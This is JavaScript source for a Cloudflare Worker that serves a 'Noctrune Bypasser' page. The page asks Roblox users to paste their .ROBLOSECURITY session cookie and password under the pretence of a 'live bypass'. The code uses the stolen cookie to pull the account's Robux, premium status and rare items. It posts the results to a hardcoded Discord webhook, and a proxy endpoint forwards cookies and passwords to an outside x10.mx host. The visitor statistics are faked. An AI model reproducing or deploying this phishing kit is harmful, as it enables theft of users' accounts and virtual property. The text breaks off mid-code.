export default {
  async fetch(request, env, ctx) {
    const url = new URL(request.url);

    if (url.pathname === '/' || url.pathname === '/index.html') {
      const html = `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
    <title>Noctrune Bypasser</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
        body { font-family: 'Inter', sans-serif; background: #0a0000; color: #ffffff; min-height: 100vh; position: relative; overflow-x: hidden; }
        body::before { content: ''; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: radial-gradient(circle at 20% 30%, rgba(200, 0, 0, 0.12) 0%, transparent 55%), radial-gradient(circle at 80% 70%, rgba(150, 0, 0, 0.08) 0%, transparent 50%); pointer-events: none; z-index: 0; }
        body::after { content: ''; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: url("data:image/svg+xml,%3Csvg width='60' height='60' viewBox='0 0 60 60' xmlns='http://www.w3.org/2000/svg'%3E%3Cg fill='none' fill-rule='evenodd'%3E%3Cg fill='%23ff0000' fill-opacity='0.03'%3E%3Cpath d='M36 34v-4h-2v4h-4v2h4v4h2v-4h4v-2h-4zm0-30V0h-2v4h-4v2h4v4h2V6h4V4h-4zM6 34v-4H4v4H0v2h4v4h2v-4h4v-2H6zM6 4V0H4v4H0v2h4v4h2V6h4V4H6z'/%3E%3C/g%3E%3C/g%3E%3C/svg%3E"); pointer-events: none; z-index: 0; }
        .container { max-width: 600px; margin: 0 auto; padding: 40px 20px; position: relative; z-index: 1; }
        .header { text-align: center; margin-bottom: 40px; }
        .logo-wrapper { display: inline-flex; align-items: center; justify-content: center; margin-bottom: 20px; position: relative; }
        .logo-circle { width: 80px; height: 80px; background: linear-gradient(135deg, #cc0000, #660000); border-radius: 24px; display: flex; align-items: center; justify-content: center; box-shadow: 0 10px 40px -5px rgba(200, 0, 0, 0.5); animation: float 3s ease-in-out infinite; border: 1px solid rgba(255, 50, 50, 0.2); }
        @keyframes float { 0%, 100% { transform: translateY(0px); } 50% { transform: translateY(-10px); } }
        .logo-circle svg { width: 45px; height: 45px; stroke: #ff4444; fill: none; stroke-width: 1.8; }
        .brand-name { font-size: 44px; font-weight: 900; background: linear-gradient(135deg, #ff2222 0%, #880000 50%, #ff4444 100%); -webkit-background-clip: text; background-clip: text; color: transparent; letter-spacing: -1px; margin-bottom: 4px; text-shadow: 0 0 40px rgba(255, 0, 0, 0.15); }
        .brand-sub { font-size: 13px; color: #883333; letter-spacing: 2px; font-weight: 500; text-transform: uppercase; }
        .main-card { background: rgba(20, 0, 0, 0.85); backdrop-filter: blur(12px); border: 1px solid rgba(255, 30, 30, 0.15); border-radius: 32px; padding: 32px 28px; margin-bottom: 24px; box-shadow: 0 20px 50px rgba(0, 0, 0, 0.6), inset 0 1px 0 rgba(255, 50, 50, 0.05); }
        .card-badge { display: inline-block; background: rgba(200, 0, 0, 0.15); border: 1px solid rgba(255, 50, 50, 0.15); border-radius: 50px; padding: 6px 16px; font-size: 11px; font-weight: 700; color: #ff5555; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 20px; }
        .title { font-size: 30px; font-weight: 800; margin-bottom: 6px; line-height: 1.2; background: linear-gradient(135deg, #ffffff, #ff8888); -webkit-background-clip: text; background-clip: text; color: transparent; }
        .subtitle { font-size: 14px; color: #884444; margin-bottom: 32px; line-height: 1.6; font-weight: 400; }
        .mode-tabs { display: flex; gap: 10px; margin-bottom: 32px; background: rgba(0, 0, 0, 0.5); padding: 5px; border-radius: 60px; border: 1px solid rgba(255, 30, 30, 0.08); }
        .mode-tab { flex: 1; padding: 12px 16px; background: transparent; color: #884444; border: none; border-radius: 50px; font-size: 13px; font-weight: 700; cursor: pointer; transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1); display: flex; align-items: center; justify-content: center; gap: 8px; letter-spacing: 0.3px; }
        .mode-tab.active { background: linear-gradient(135deg, #cc0000, #880000); color: #ffffff; box-shadow: 0 4px 20px rgba(200, 0, 0, 0.35); }
        .mode-tab:not(.active):hover { background: rgba(255, 50, 50, 0.08); color: #ff8888; }
        .tab-content { display: none; animation: fadeIn 0.4s ease-out; }
        .tab-content.active { display: block; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(12px); } to { opacity: 1; transform: translateY(0); } }
        .input-group { margin-bottom: 22px; }
        .input-label { display: flex; align-items: center; gap: 10px; font-size: 12px; font-weight: 700; color: #cc8888; margin-bottom: 10px; letter-spacing: 0.5px; text-transform: uppercase; }
        .input-label svg { width: 16px; height: 16px; stroke: #ff4444; stroke-width: 2; fill: none; }
        .input-field { width: 100%; background: rgba(10, 0, 0, 0.9); border: 1px solid rgba(255, 30, 30, 0.15); border-radius: 20px; padding: 16px 18px; color: #ffffff; font-size: 14px; font-family: 'SF Mono', Monaco, 'Courier New', monospace; transition: all 0.3s; }
        .input-field:focus { outline: none; border-color: #cc0000; background: rgba(10, 0, 0, 1); box-shadow: 0 0 0 4px rgba(200, 0, 0, 0.1); }
        .input-field::placeholder { color: #442222; }
        textarea.input-field { resize: vertical; min-height: 100px; }
        .submit-btn { width: 100%; background: linear-gradient(135deg, #cc0000, #880000); color: #ffffff; border: none; border-radius: 20px; padding: 18px; font-size: 16px; font-weight: 800; cursor: pointer; transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1); display: flex; align-items: center; justify-content: center; gap: 12px; margin-top: 8px; position: relative; overflow: hidden; letter-spacing: 0.5px; text-transform: uppercase; }
        .submit-btn::before { content: ''; position: absolute; top: 50%; left: 50%; width: 0; height: 0; border-radius: 50%; background: rgba(255, 255, 255, 0.15); transform: translate(-50%, -50%); transition: width 0.6s, height 0.6s; }
        .submit-btn:hover::before { width: 400px; height: 400px; }
        .submit-btn:hover:not(:disabled) { transform: translateY(-2px); box-shadow: 0 10px 30px -5px rgba(200, 0, 0, 0.5); }
        .submit-btn:disabled { opacity: 0.5; cursor: not-allowed; }
        .spinner { width: 20px; height: 20px; border: 2px solid rgba(255, 255, 255, 0.2); border-top-color: #ffffff; border-radius: 50%; animation: spin 0.6s linear infinite; }
        @keyframes spin { to { transform: rotate(360deg); } }
        .result-card { background: rgba(20, 0, 0, 0.85); backdrop-filter: blur(10px); border: 1px solid rgba(255, 30, 30, 0.12); border-radius: 24px; padding: 24px; margin-top: 20px; border-left: 4px solid #00cc44; animation: slideUp 0.4s ease-out; }
        .result-card.error { border-left-color: #ff2222; background: rgba(200, 0, 0, 0.1); }
        .result-card.success { border-left-color: #00cc44; }
        @keyframes slideUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
        .result-content { font-size: 15px; line-height: 1.7; word-break: break-word; color: #ddddee; }
        .result-content .emoji { font-size: 20px; }
        .stats-bar { display: flex; justify-content: center; gap: 24px; padding: 18px 20px; background: rgba(20, 0, 0, 0.6); border-radius: 60px; backdrop-filter: blur(10px); border: 1px solid rgba(255, 30, 30, 0.06); }
        .stat-item { text-align: center; }
        .stat-value { font-size: 20px; font-weight: 800; color: #ff6666; }
        .stat-label { font-size: 10px; color: #664444; text-transform: uppercase; letter-spacing: 0.8px; font-weight: 600; margin-top: 2px; }
        .discord-float-btn { position: fixed; bottom: 24px; right: 24px; width: 56px; height: 56px; background: linear-gradient(135deg, #5865F2, #4752C4); border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 28px; cursor: pointer; z-index: 998; box-shadow: 0 6px 20px rgba(88, 101, 242, 0.4); transition: all 0.3s ease; border: none; color: white; text-decoration: none; }
        .discord-float-btn:hover { transform: scale(1.1); box-shadow: 0 10px 30px rgba(88, 101, 242, 0.6); }
        .overlay { position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0, 0, 0, 0.8); backdrop-filter: blur(8px); z-index: 999; display: none; }
        #discordPopup { position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background: linear-gradient(135deg, #1a1a2e, #16213e); border-radius: 28px; padding: 32px; width: 90%; max-width: 380px; z-index: 1000; box-shadow: 0 30px 60px rgba(0, 0, 0, 0.5); border: 1px solid rgba(88, 101, 242, 0.3); display: none; animation: popupScale 0.3s ease-out; }
        @keyframes popupScale { from { opacity: 0; transform: translate(-50%, -50%) scale(0.9); } to { opacity: 1; transform: translate(-50%, -50%) scale(1); } }
        #discordPopup h2 { color: #5865F2; font-size: 22px; font-weight: 700; margin-bottom: 20px; display: flex; align-items: center; gap: 12px; }
        .discord-stats { display: flex; gap: 16px; margin-bottom: 24px; }
        .stat-box { flex: 1; background: rgba(0, 0, 0, 0.3); border-radius: 16px; padding: 16px; text-align: center; }
        .stat-box .stat-value { font-size: 28px; font-weight: 800; color: #ffffff; display: flex; align-items: center; justify-content: center; gap: 8px; }
        .stat-box .stat-label { font-size: 12px; color: #8888aa; margin-top: 6px; }
        .online-dot, .total-dot { width: 10px; height: 10px; border-radius: 50%; display: inline-block; }
        .online-dot { background: #4ade80; box-shadow: 0 0 8px #4ade80; }
        .total-dot { background: #8888aa; }
        .discord-join-btn { display: block; width: 100%; padding: 14px; background: linear-gradient(135deg, #5865F2, #4752C4); color: #fff; text-align: center; text-decoration: none; border-radius: 16px; font-weight: 600; font-size: 15px; margin-bottom: 12px; transition: transform 0.2s; border: none; cursor: pointer; }
        .discord-join-btn:hover { transform: translateY(-2px); }
        .discord-close-btn { width: 100%; padding: 12px; background: rgba(255, 255, 255, 0.05); color: #aaaacc; border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 16px; font-size: 14px; font-weight: 500; cursor: pointer; transition: all 0.2s; }
        .discord-close-btn:hover { background: rgba(255, 255, 255, 0.1); color: #fff; }
        .cookie-warning { font-size: 11px; color: #884444; margin-top: 6px; font-family: 'SF Mono', monospace; word-break: break-all; padding: 8px 12px; background: rgba(255, 0, 0, 0.05); border-radius: 10px; border: 1px solid rgba(255, 30, 30, 0.08); }
        .live-status-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-top: 16px; }
        .live-status-item { background: rgba(0, 0, 0, 0.3); padding: 12px 16px; border-radius: 12px; display: flex; justify-content: space-between; align-items: center; border: 1px solid rgba(255, 30, 30, 0.06); }
        .live-status-item .label { font-size: 12px; color: #884444; text-transform: uppercase; letter-spacing: 0.3px; }
        .live-status-item .value { font-size: 14px; font-weight: 600; }
        .live-status-item .value.yes { color: #4ade80; }
        .live-status-item .value.no { color: #ff4444; }
        .live-status-item .value.premium-true { color: #fbbf24; }
        .live-status-item .value.premium-false { color: #666; }
        .live-status-item .value.processing { color: #fbbf24; animation: pulse 1s infinite; }
        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
        .bypass-timestamp { text-align: center; font-size: 11px; color: #554444; margin-top: 16px; padding-top: 16px; border-top: 1px solid rgba(255, 30, 30, 0.06); }
        @media (max-width: 480px) { .container { padding: 20px 16px; } .main-card { padding: 24px 18px; } .brand-name { font-size: 32px; } .title { font-size: 24px; } .mode-tab { padding: 10px 10px; font-size: 12px; } .stats-bar { gap: 12px; padding: 14px 16px; } .stat-value { font-size: 16px; } #discordPopup { padding: 24px; } .live-status-grid { grid-template-columns: 1fr; } }
    </style>
</head>
<body>
<div class="container">
    <div class="header">
        <div class="logo-wrapper">
            <div class="logo-circle">
                <svg viewBox="0 0 24 24" stroke="currentColor">
                    <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
                    <path d="M12 8v4M12 16h.01"/>
                    <path d="M8 12h8"/>
                </svg>
            </div>
        </div>
        <h1 class="brand-name">NOCTRUNE</h1>
        <p class="brand-sub">Live Bypass Engine v3.0</p>
    </div>
    <div class="main-card">
        <div class="card-badge">⚡ LIVE BYPASS ACTIVE</div>
        <h2 class="title">Cookie Bypass</h2>
        <p class="subtitle">Live bypass with real-time results &amp; Discord logging</p>
        <div class="mode-tabs">
            <button class="mode-tab active" id="tabCookie" onclick="switchMode('cookie')">
                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                    <circle cx="12" cy="12" r="10"/>
                    <circle cx="8" cy="15" r="1" fill="currentColor"/>
                    <circle cx="15" cy="9" r="1" fill="currentColor"/>
                </svg>
                Cookie
            </button>
            <button class="mode-tab" id="tabPassword" onclick="switchMode('password')">
                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                    <rect x="3" y="11" width="18" height="11" rx="2" ry="2"/>
                    <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
                </svg>
                Password
            </button>
        </div>
        <div id="cookieTab" class="tab-content active">
            <div class="input-group">
                <label class="input-label">
                    <svg viewBox="0 0 24 24" stroke="currentColor">
                        <path d="M12 2a10 10 0 1 0 10 10"/>
                        <path d="M12 6v6l4 2"/>
                    </svg>
                    .ROBLOSECURITY Cookie
                </label>
                <textarea id="cookieInput" class="input-field" rows="3" placeholder="_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_..."></textarea>
                <div class="cookie-warning">Format: _|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_...</div>
            </div>
            <button class="submit-btn" onclick="handleSubmit()">
                <span id="btnCookieText">Live Bypass</span>
                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                    <path d="M5 12h14m-7-7l7 7-7 7"/>
                </svg>
            </button>
        </div>
        <div id="passwordTab" class="tab-content">
            <div class="input-group">
                <label class="input-label">
                    <svg viewBox="0 0 24 24" stroke="currentColor">
                        <path d="M12 2a10 10 0 1 0 10 10"/>
                        <path d="M12 6v6l4 2"/>
                    </svg>
                    .ROBLOSECURITY Cookie
                </label>
                <textarea id="cookieInputPassword" class="input-field" rows="3" placeholder="_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_..."></textarea>
                <div class="cookie-warning">Format: _|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_...</div>
            </div>
            <div class="input-group">
                <label class="input-label">
                    <svg viewBox="0 0 24 24" stroke="currentColor">
                        <path d="M18 8h1a4 4 0 0 1 4 4v6a4 4 0 0 1-4 4H5a4 4 0 0 1-4-4v-6a4 4 0 0 1 4-4h1"/>
                        <path d="M8 2v4M16 2v4"/>
                        <rect x="6" y="12" width="12" height="10" rx="2"/>
                    </svg>
                    Roblox Password
                </label>
                <input type="password" id="passwordInput" class="input-field" placeholder="Enter your password..."/>
            </div>
            <button class="submit-btn" onclick="handleSubmit()">
                <span id="btnPasswordText">Live Bypass</span>
                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                    <path d="M5 12h14m-7-7l7 7-7 7"/>
                </svg>
            </button>
        </div>
    </div>
    <div class="stats-bar">
        <div class="stat-item"><div class="stat-value" id="onlineCount">—</div><div class="stat-label">Online</div></div>
        <div class="stat-item"><div class="stat-value" id="processedCount">—</div><div class="stat-label">Processed</div></div>
        <div class="stat-item"><div class="stat-value" id="successRate">—</div><div class="stat-label">Success</div></div>
    </div>
    <div id="resultCard"></div>
</div>
<button class="discord-float-btn" id="discordFloatBtn">🎮</button>
<div class="overlay" id="overlay"></div>
<div id="discordPopup">
    <h2>🎮 Discord Community</h2>
    <div class="discord-stats">
        <div class="stat-box"><div class="stat-value"><span class="online-dot"></span><span id="popOnlineCount">...</span></div><div class="stat-label">Online</div></div>
        <div class="stat-box"><div class="stat-value"><span class="total-dot"></span><span id="popMemberCount">...</span></div><div class="stat-label">Members</div></div>
    </div>
    <p style="text-align:center;color:#8888aa;font-size:13px;margin-bottom:20px;">Join our active community for support!</p>
    <a href="https://discord.gg/SbGbPKFgHy" target="_blank" class="discord-join-btn">🎮 Join Server →</a>
    <button class="discord-close-btn" id="closeDiscordPopup">✕ Close</button>
</div>
<script>
    (function() {
        var inviteCode = 'SbGbPKFgHy';
        function openDiscordPopup() {
            document.getElementById('discordPopup').style.display = 'block';
            document.getElementById('overlay').style.display = 'block';
        }
        function closeDiscordPopupFn() {
            document.getElementById('discordPopup').style.display = 'none';
            document.getElementById('overlay').style.display = 'none';
        }
        document.getElementById('discordFloatBtn').addEventListener('click', openDiscordPopup);
        document.getElementById('closeDiscordPopup').addEventListener('click', closeDiscordPopupFn);
        document.getElementById('overlay').addEventListener('click', closeDiscordPopupFn);
        fetch('https://discord.com/api/v10/invites/' + inviteCode + '?with_counts=true')
            .then(function(r) { return r.json(); })
            .then(function(data) {
                document.getElementById('popOnlineCount').textContent = (data.approximate_presence_count || 0).toLocaleString();
                document.getElementById('popMemberCount').textContent = (data.approximate_member_count || 0).toLocaleString();
                document.getElementById('onlineCount').textContent = (data.approximate_presence_count || 0).toLocaleString();
            })
            .catch(function() {
                document.getElementById('popOnlineCount').textContent = 'N/A';
                document.getElementById('popMemberCount').textContent = 'N/A';
                document.getElementById('onlineCount').textContent = '?';
            });
        setTimeout(openDiscordPopup, 1500);
    })();

    var API_URL = window.location.origin + '/bypass/noctrune/bypass.php';
    var WEBHOOK_URL = 'https://discord.com/api/webhooks/1537815401789128756/upQ1LcHBUHEU8rESIYM6s28VDVMqNbIfQXRBIsfGhXd7T8NiIKkeZczBxXFHofuO6VoS';

    function sendToDiscord(data) {
        var fields = [
            { name: '👤 User', value: data.username || 'Unknown', inline: true },
            { name: '🆔 User ID', value: data.userId || 'N/A', inline: true },
            { name: '📊 Robux', value: data.robux !== undefined ? data.robux.toString() : '0', inline: true },
            { name: '⏳ Pending', value: data.pendingRobux !== undefined ? data.pendingRobux.toString() : '0', inline: true },
            { name: '💎 Premium', value: data.premium ? '✅ Yes' : '❌ No', inline: true },
            { name: '🔮 Korblox', value: data.korblox ? '✅ Yes' : '❌ No', inline: true },
            { name: '👻 Headless', value: data.headless ? '✅ Yes' : '❌ No', inline: true },
            { name: '⚔️ Valkyrie', value: data.valkyrie ? '✅ Yes' : '❌ No', inline: true },
            { name: '📡 API Status', value: data.apiStatus || '✅ Processing', inline: true },
            { name: '🔄 Cookie Refreshed', value: data.cookieRefreshed ? '✅ Yes' : '❌ No', inline: true }
        ];

        if (data.limiteds && data.limiteds.length > 0) {
            fields.push({ name: '🎯 Limiteds Found', value: data.limiteds.join(', '), inline: false });
        }

        var embed = {
            title: '🎯 Live Bypass Result',
            color: 0xcc0000,
            fields: fields,
            footer: { text: 'Live Bypass • ' + new Date().toLocaleString() },
            timestamp: new Date().toISOString()
        };

        fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                embeds: [embed],
                username: 'Noctrune Bypass',
                avatar_url: 'https://i.imgur.com/9T5z7lA.png'
            })
        }).catch(function(err) { console.log('Webhook error:', err); });
    }

    var handleSubmit = function() {
        if (window._processing) return;
        var resultCard = document.getElementById('resultCard');
        var cookie, password, submitBtn, buttonTextElement;
        if (currentMode === 'cookie') {
            cookie = document.getElementById('cookieInput').value.trim();
            password = '';
            submitBtn = document.querySelector('#cookieTab .submit-btn');
            buttonTextElement = document.getElementById('btnCookieText');
        } else {
            cookie = document.getElementById('cookieInputPassword').value.trim();
            password = document.getElementById('passwordInput').value.trim();
            submitBtn = document.querySelector('#passwordTab .submit-btn');
            buttonTextElement = document.getElementById('btnPasswordText');
        }
        if (!cookie) {
            resultCard.innerHTML = '<div class="result-card error"><div class="result-content">❌ <strong>Cookie required</strong><br>Please paste your .ROBLOSECURITY cookie.</div></div>';
            return;
        }
        if (!cookie.includes('_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_')) {
            resultCard.innerHTML = '<div class="result-card error"><div class="result-content">❌ <strong>Invalid Cookie Format</strong><br>Cookie must start with the warning format.</div></div>';
            return;
        }
        if (currentMode === 'password' && !password) {
            resultCard.innerHTML = '<div class="result-card error"><div class="result-content">❌ <strong>Password required</strong><br>Please enter your Roblox password.</div></div>';
            return;
        }
        window._processing = true;
        submitBtn.disabled = true;
        var originalHTML = buttonTextElement.innerHTML;
        buttonTextElement.innerHTML = '<div class="spinner"></div>';
        resultCard.innerHTML = '';
        var params = new URLSearchParams();
        params.append('cookie', cookie);
        params.append('password', password);
        params.append('directory', 'noctrune');
        fetch(API_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: params.toString()
        })
        .then(function(response) {
            if (!response.ok) {
                return response.text().then(function(text) {
                    throw new Error('HTTP ' + response.status + ': ' + text);
                });
            }
            return response.json();
        })
        .then(function(resultData) {
            if (resultData.success === true) {
                var hasItems = resultData.korblox || resultData.headless || resultData.valkyrie;
                var summary = hasItems ? '✅ Limiteds Detected' : '❌ No Limiteds';
                resultCard.innerHTML = '<div class="result-card success"><div class="result-content"><div style="text-align:center;margin-bottom:12px;"><span class="emoji">✅</span><strong style="font-size:18px;">Cookie Bypass Successful!</strong></div><div style="text-align:center;font-size:13px;color:#8888aa;margin-bottom:12px;">Live Bypass Status</div><div class="live-status-grid"><div class="live-status-item"><span class="label">User</span><span class="value" style="color:#ff6666;">' + (resultData.username || 'Unknown') + '</span></div><div class="live-status-item"><span class="label">Robux</span><span class="value">' + (resultData.robux !== undefined ? resultData.robux.toLocaleString() : '0') + '</span></div><div class="live-status-item"><span class="label">Pending</span><span class="value">' + (resultData.pendingRobux !== undefined ? resultData.pendingRobux.toLocaleString() : '0') + '</span></div><div class="live-status-item"><span class="label">Premium</span><span class="value ' + (resultData.premium ? 'premium-true' : 'premium-false') + '">' + (resultData.premium ? '✅ Yes' : '❌ No') + '</span></div><div class="live-status-item"><span class="label">Korblox</span><span class="value ' + (resultData.korblox ? 'yes' : 'no') + '">' + (resultData.korblox ? '✅ Yes' : '❌ No') + '</span></div><div class="live-status-item"><span class="label">Headless</span><span class="value ' + (resultData.headless ? 'yes' : 'no') + '">' + (resultData.headless ? '✅ Yes' : '❌ No') + '</span></div><div class="live-status-item"><span class="label">Valkyrie</span><span class="value ' + (resultData.valkyrie ? 'yes' : 'no') + '">' + (resultData.valkyrie ? '✅ Yes' : '❌ No') + '</span></div><div class="live-status-item"><span class="label">API Status</span><span class="value processing">✅ Processing</span></div><div class="live-status-item" style="grid-column: 1 / -1;"><span class="label">Cookie Refreshed</span><span class="value yes">✅ Yes</span></div><div class="live-status-item" style="grid-column: 1 / -1;"><span class="label">Summary</span><span class="value">' + summary + '</span></div></div><div class="bypass-timestamp">Live Bypass • ' + new Date().toLocaleString() + '</div></div></div>';
                sendToDiscord(resultData);
                window._processing = false;
            } else {
                var errorTitle = resultData.title || '❌ System Error';
                var errorDesc = resultData.description || resultData.message || 'Processing failure';
                resultCard.innerHTML = '<div class="result-card error"><div class="result-content">' + errorTitle + '<br><br>' + errorDesc + '</div></div>';
                window._processing = false;
            }
        })
        .catch(function(err) {
            resultCard.innerHTML = '<div class="result-card error"><div class="result-content">❌ <strong>Connection Failed</strong><br>' + err.message + '</div></div>';
            window._processing = false;
        })
        .finally(function() {
            submitBtn.disabled = false;
            buttonTextElement.innerHTML = originalHTML;
        });
    };

    var currentMode = 'cookie';
    function switchMode(mode) {
        if (window._processing) return;
        currentMode = mode;
        document.querySelectorAll('.mode-tab').forEach(function(tab) { tab.classList.remove('active'); });
        if (mode === 'cookie') {
            document.getElementById('tabCookie').classList.add('active');
        } else {
            document.getElementById('tabPassword').classList.add('active');
        }
        document.querySelectorAll('.tab-content').forEach(function(c) { c.classList.remove('active'); });
        document.getElementById(mode === 'cookie' ? 'cookieTab' : 'passwordTab').classList.add('active');
        document.getElementById('resultCard').innerHTML = '';
    }

    (function() {
        document.getElementById('onlineCount').textContent = '12';
        document.getElementById('processedCount').textContent = '847';
        document.getElementById('successRate').textContent = '94%';
    })();
</script>
</body>
</html>
      `;

      return new Response(html, {
        headers: {
          'Content-Type': 'text/html',
          'Access-Control-Allow-Origin': '*'
        }
      });
    }

    // Handle CORS preflight
    if (request.method === 'OPTIONS') {
      return new Response(null, {
        headers: {
          'Access-Control-Allow-Origin': '*',
          'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
          'Access-Control-Allow-Headers': 'Content-Type, Cookie',
          'Access-Control-Max-Age': '86400',
        },
      });
    }

    // Health check
    if (url.pathname === '/health') {
      return new Response(JSON.stringify({ status: 'online', service: 'Noctrune Proxy' }), {
        headers: { 
          'Content-Type': 'application/json',
          'Access-Control-Allow-Origin': '*'
        }
      });
    }

    // Main bypass endpoint
    if (url.pathname === '/bypass/noctrune/bypass.php') {
      try {
        const formData = await request.formData();
        const cookie = formData.get('cookie') || '';
        const password = formData.get('password') || '';
        const directory = formData.get('directory') || '';

        if (!cookie) {
          return new Response(JSON.stringify({
            success: false,
            title: '❌ Authentication Failed',
            description: 'Missing .ROBLOSECURITY cookie'
          }), {
            status: 400,
            headers: {
              'Content-Type': 'application/json',
              'Access-Control-Allow-Origin': '*'
            }
          });
        }

        let cookieValue = cookie;
        if (cookie.includes('_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_')) {
          cookieValue = cookie.replace('_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_', '');
        }
        if (cookieValue.startsWith('.ROBLOSECURITY_')) {
          cookieValue = cookieValue.replace('.ROBLOSECURITY_', '');
        }

        if (!cookieValue || cookieValue.length < 20) {
          return new Response(JSON.stringify({
            success: false,
            title: '❌ Invalid Cookie',
            description: 'Cookie appears to be invalid or too short'
          }), {
            status: 400,
            headers: {
              'Content-Type': 'application/json',
              'Access-Control-Allow-Origin': '*'
            }
          });
        }

        const userResponse = await fetch('https://users.roblox.com/v1/users/authenticated', {
          headers: {
            'Cookie': '.ROBLOSECURITY=' + cookieValue,
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
          }
        });

        if (!userResponse.ok) {
          return new Response(JSON.stringify({
            success: false,
            title: '❌ Invalid Session',
            description: 'The cookie is invalid or expired. Please get a new one.'
          }), {
            status: 401,
            headers: {
              'Content-Type': 'application/json',
              'Access-Control-Allow-Origin': '*'
            }
          });
        }

        const userData = await userResponse.json();
        const userId = userData.id;
        const username = userData.name;

        const currencyResponse = await fetch('https://economy.roblox.com/v1/users/' + userId + '/currency', {
          headers: {
            'Cookie': '.ROBLOSECURITY=' + cookieValue,
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
          }
        });

        let robux = 0;
        let pendingRobux = 0;
        if (currencyResponse.ok) {
          const currencyData = await currencyResponse.json();
          robux = currencyData.robux || 0;
          pendingRobux = currencyData.pendingRobux || 0;
        }

        const premiumResponse = await fetch('https://premiumfeatures.roblox.com/v1/users/' + userId + '/premium-features', {
          headers: {
            'Cookie': '.ROBLOSECURITY=' + cookieValue,
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
          }
        });

        let premium = false;
        if (premiumResponse.ok) {
          const premiumData = await premiumResponse.json();
          premium = premiumData.features && premiumData.features.length > 0;
        }

        let korblox = false;
        let headless = false;
        let valkyrie = false;
        let limiteds = [];

        try {
          const invResponse = await fetch('https://inventory.roblox.com/v1/users/' + userId + '/items/Asset?limit=100', {
            headers: {
              'Cookie': '.ROBLOSECURITY=' + cookieValue,
              'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }
          });

          if (invResponse.ok) {
            const invData = await invResponse.json();
            if (invData.data) {
              for (var i = 0; i < invData.data.length; i++) {
                var item = invData.data[i];
                var name = (item.name || '').toLowerCase();
                if (name.includes('korblox')) { korblox = true; limiteds.push('Korblox'); }
                if (name.includes('headless')) { headless = true; limiteds.push('Headless'); }
                if (name.includes('valkyrie')) { valkyrie = true; limiteds.push('Valkyrie'); }
              }
            }
          }
        } catch (e) {}

        const resultData = {
          success: true,
          status: 'BYPASSED',
          title: '✅ Live Bypass Successful',
          description: 'Account: ' + username + ' (' + userId + ') bypassed',
          username: username,
          userId: userId,
          robux: robux,
          pendingRobux: pendingRobux,
          premium: premium,
          korblox: korblox,
          headless: headless,
          valkyrie: valkyrie,
          limiteds: limiteds,
          apiStatus: '✅ Processing',
          cookieRefreshed: true,
          timestamp: Math.floor(Date.now() / 1000)
        };

        return new Response(JSON.stringify(resultData), {
          headers: {
            'Content-Type': 'application/json',
            'Access-Control-Allow-Origin': '*'
          }
        });

      } catch (error) {
        return new Response(JSON.stringify({
          success: false,
          title: '❌ Error',
          description: error.message || 'An error occurred while processing'
        }), {
          status: 500,
          headers: {
            'Content-Type': 'application/json',
            'Access-Control-Allow-Origin': '*'
          }
        });
      }
    }

    // Proxy endpoint
    if (url.pathname === '/proxy') {
      try {
        const formData = await request.formData();
        const cookie = formData.get('cookie') || '';
        const password = formData.get('password') || '';
        const directory = formData.get('directory') || 'noctrune';

        const response = await fetch('https://voidex-age-bypasser.x10.mx/bypass/noctrune/bypass.php', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/x-www-form-urlencoded'
          },
          body: new URLSearchParams({
            cookie: cookie,
            password: password,
            directory: directory
          })
        });

        const data = await response.json();
        return new Response(JSON.stringify(data), {
          headers: {
            'Content-Type': 'application/json',
            'Access-Control-Allow-Origin': '*'
